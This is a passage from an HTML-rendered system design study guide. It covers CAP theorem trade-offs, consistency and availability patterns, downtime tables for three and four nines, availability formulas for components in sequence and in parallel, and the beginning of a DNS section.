&lt;h4&gt;&lt;a id="user-content-cp---consistency-and-partition-tolerance" class="anchor" aria-hidden="true" href="#cp---consistency-and-partition-tolerance"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;CP - consistency and partition tolerance&lt;/h4&gt;
&lt;p&gt;Waiting for a response from the partitioned node might result in a timeout error.  CP is a good choice if your business needs require atomic reads and writes.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-ap---availability-and-partition-tolerance" class="anchor" aria-hidden="true" href="#ap---availability-and-partition-tolerance"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;AP - availability and partition tolerance&lt;/h4&gt;
&lt;p&gt;Responses return the most recent version of the data available on a node, which might not be the latest.  Writes might take some time to propagate when the partition is resolved.&lt;/p&gt;
&lt;p&gt;AP is a good choice if the business needs allow for &lt;a href="#eventual-consistency"&gt;eventual consistency&lt;/a&gt; or when the system needs to continue working despite external errors.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-sources-and-further-reading-3" class="anchor" aria-hidden="true" href="#sources-and-further-reading-3"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://robertgreiner.com/2014/08/cap-theorem-revisited/" rel="nofollow"&gt;CAP theorem revisited&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ksat.me/a-plain-english-introduction-to-cap-theorem/" rel="nofollow"&gt;A plain english introduction to CAP theorem&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/henryr/cap-faq"&gt;CAP FAQ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-consistency-patterns" class="anchor" aria-hidden="true" href="#consistency-patterns"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Consistency patterns&lt;/h2&gt;
&lt;p&gt;With multiple copies of the same data, we are faced with options on how to synchronize them so clients have a consistent view of the data.  Recall the definition of consistency from the &lt;a href="#cap-theorem"&gt;CAP theorem&lt;/a&gt; - Every read receives the most recent write or an error.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-weak-consistency" class="anchor" aria-hidden="true" href="#weak-consistency"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Weak consistency&lt;/h3&gt;
&lt;p&gt;After a write, reads may or may not see it.  A best effort approach is taken.&lt;/p&gt;
&lt;p&gt;This approach is seen in systems such as memcached.  Weak consistency works well in real time use cases such as VoIP, video chat, and realtime multiplayer games.  For example, if you are on a phone call and lose reception for a few seconds, when you regain connection you do not hear what was spoken during connection loss.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-eventual-consistency" class="anchor" aria-hidden="true" href="#eventual-consistency"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Eventual consistency&lt;/h3&gt;
&lt;p&gt;After a write, reads will eventually see it (typically within milliseconds).  Data is replicated asynchronously.&lt;/p&gt;
&lt;p&gt;This approach is seen in systems such as DNS and email.  Eventual consistency works well in highly available systems.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-strong-consistency" class="anchor" aria-hidden="true" href="#strong-consistency"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Strong consistency&lt;/h3&gt;
&lt;p&gt;After a write, reads will see it.  Data is replicated synchronously.&lt;/p&gt;
&lt;p&gt;This approach is seen in file systems and RDBMSes.  Strong consistency works well in systems that need transactions.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-sources-and-further-reading-4" class="anchor" aria-hidden="true" href="#sources-and-further-reading-4"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://snarfed.org/transactions_across_datacenters_io.html" rel="nofollow"&gt;Transactions across data centers&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-availability-patterns" class="anchor" aria-hidden="true" href="#availability-patterns"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Availability patterns&lt;/h2&gt;
&lt;p&gt;There are two main patterns to support high availability: &lt;strong&gt;fail-over&lt;/strong&gt; and &lt;strong&gt;replication&lt;/strong&gt;.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-fail-over" class="anchor" aria-hidden="true" href="#fail-over"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Fail-over&lt;/h3&gt;
&lt;h4&gt;&lt;a id="user-content-active-passive" class="anchor" aria-hidden="true" href="#active-passive"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Active-passive&lt;/h4&gt;
&lt;p&gt;With active-passive fail-over, heartbeats are sent between the active and the passive server on standby.  If the heartbeat is interrupted, the passive server takes over the active's IP address and resumes service.&lt;/p&gt;
&lt;p&gt;The length of downtime is determined by whether the passive server is already running in 'hot' standby or whether it needs to start up from 'cold' standby.  Only the active server handles traffic.&lt;/p&gt;
&lt;p&gt;Active-passive failover can also be referred to as master-slave failover.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-active-active" class="anchor" aria-hidden="true" href="#active-active"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Active-active&lt;/h4&gt;
&lt;p&gt;In active-active, both servers are managing traffic, spreading the load between them.&lt;/p&gt;
&lt;p&gt;If the servers are public-facing, the DNS would need to know about the public IPs of both servers.  If the servers are internal-facing, application logic would need to know about both servers.&lt;/p&gt;
&lt;p&gt;Active-active failover can also be referred to as master-master failover.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-disadvantages-failover" class="anchor" aria-hidden="true" href="#disadvantages-failover"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): failover&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Fail-over adds more hardware and additional complexity.&lt;/li&gt;
&lt;li&gt;There is a potential for loss of data if the active system fails before any newly written data can be replicated to the passive.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-replication" class="anchor" aria-hidden="true" href="#replication"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Replication&lt;/h3&gt;
&lt;h4&gt;&lt;a id="user-content-master-slave-and-master-master" class="anchor" aria-hidden="true" href="#master-slave-and-master-master"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Master-slave and master-master&lt;/h4&gt;
&lt;p&gt;This topic is further discussed in the &lt;a href="#database"&gt;Database&lt;/a&gt; section:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#master-slave-replication"&gt;Master-slave replication&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#master-master-replication"&gt;Master-master replication&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-availability-in-numbers" class="anchor" aria-hidden="true" href="#availability-in-numbers"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Availability in numbers&lt;/h3&gt;
&lt;p&gt;Availability is often quantified by uptime (or downtime) as a percentage of time the service is available.  Availability is generally measured in number of 9s--a service with 99.99% availability is described as having four 9s.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-999-availability---three-9s" class="anchor" aria-hidden="true" href="#999-availability---three-9s"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;99.9% availability - three 9s&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Duration&lt;/th&gt;
&lt;th&gt;Acceptable downtime&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Downtime per year&lt;/td&gt;
&lt;td&gt;8h 45min 57s&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Downtime per month&lt;/td&gt;
&lt;td&gt;43m 49.7s&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Downtime per week&lt;/td&gt;
&lt;td&gt;10m 4.8s&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Downtime per day&lt;/td&gt;
&lt;td&gt;1m 26.4s&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;&lt;a id="user-content-9999-availability---four-9s" class="anchor" aria-hidden="true" href="#9999-availability---four-9s"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;99.99% availability - four 9s&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Duration&lt;/th&gt;
&lt;th&gt;Acceptable downtime&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Downtime per year&lt;/td&gt;
&lt;td&gt;52min 35.7s&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Downtime per month&lt;/td&gt;
&lt;td&gt;4m 23s&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Downtime per week&lt;/td&gt;
&lt;td&gt;1m 5s&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Downtime per day&lt;/td&gt;
&lt;td&gt;8.6s&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;&lt;a id="user-content-availability-in-parallel-vs-in-sequence" class="anchor" aria-hidden="true" href="#availability-in-parallel-vs-in-sequence"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Availability in parallel vs in sequence&lt;/h4&gt;
&lt;p&gt;If a service consists of multiple components prone to failure, the service's overall availability depends on whether the components are in sequence or in parallel.&lt;/p&gt;
&lt;h6&gt;&lt;a id="user-content-in-sequence" class="anchor" aria-hidden="true" href="#in-sequence"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;In sequence&lt;/h6&gt;
&lt;p&gt;Overall availability decreases when two components with availability &amp;lt; 100% are in sequence:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Availability (Total) = Availability (Foo) * Availability (Bar)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If both &lt;code&gt;Foo&lt;/code&gt; and &lt;code&gt;Bar&lt;/code&gt; each had 99.9% availability, their total availability in sequence would be 99.8%.&lt;/p&gt;
&lt;h6&gt;&lt;a id="user-content-in-parallel" class="anchor" aria-hidden="true" href="#in-parallel"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;In parallel&lt;/h6&gt;
&lt;p&gt;Overall availability increases when two components with availability &amp;lt; 100% are in parallel:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Availability (Total) = 1 - (1 - Availability (Foo)) * (1 - Availability (Bar))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If both &lt;code&gt;Foo&lt;/code&gt; and &lt;code&gt;Bar&lt;/code&gt; each had 99.9% availability, their total availability in parallel would be 99.9999%.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-domain-name-system" class="anchor" aria-hidden="true" href="#domain-name-system"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Domain name system&lt;/h2&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/fae27d1291ed38dd120595d692eacd2505cd3a9c/687474703a2f2f692e696d6775722e636f6d2f494f794c6a34692e6a7067"&gt;&lt;img src="https://camo.githubusercontent.com/fae27d1291ed38dd120595d692eacd2505cd3a9c/687474703a2f2f692e696d6775722e636f6d2f494f794c6a34692e6a7067" data-canonical-src="http://i.imgur.com/IOyLj4i.jpg" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://www.slideshare.net/srikrupa5/dns-security-presentation-issa" rel="nofollow"&gt;Source: DNS security presentation&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;A Domain Name System (DNS) translates a domain name such as &lt;a href="http://www.example.com" rel="nofollow"&gt;www.example.com&lt;/a&gt; to an IP address.&lt;/p&gt;
&lt;p&gt;DNS is hierarchical, with a few authoritative servers at the top level.  Your router or ISP provides information about which DNS server(s) to contact when doing a lookup.  Lower level DNS servers cache mappings, which could become stale due to DNS propagation delays.  DNS results can also be cached by your browser or OS for a certain period of time, determined by the &lt;a href="https://en.wikipedia.org/wiki/Time_to_live" rel="nofollow"&gt;time to live (TTL)&lt;/a&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;NS record (name server)&lt;/strong&gt; - Specifies the DNS servers for your domain/subdomain.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;MX record (mail exchange)&lt;/strong&gt; - Specifies the mail servers for accepting messages.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;A record (address)&lt;/strong&gt; - Points a name to an IP address.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CNAME (canonical)&lt;/strong&gt; - Points a name to another name or &lt;code&gt;CNAME&lt;/code&gt; (example.com to &lt;a href="http://www.example.com" rel="nofollow"&gt;www.example.com&lt;/a&gt;) or to an &lt;code&gt;A&lt;/code&gt; record.&lt;/li&gt;
&lt;/ul&gt;
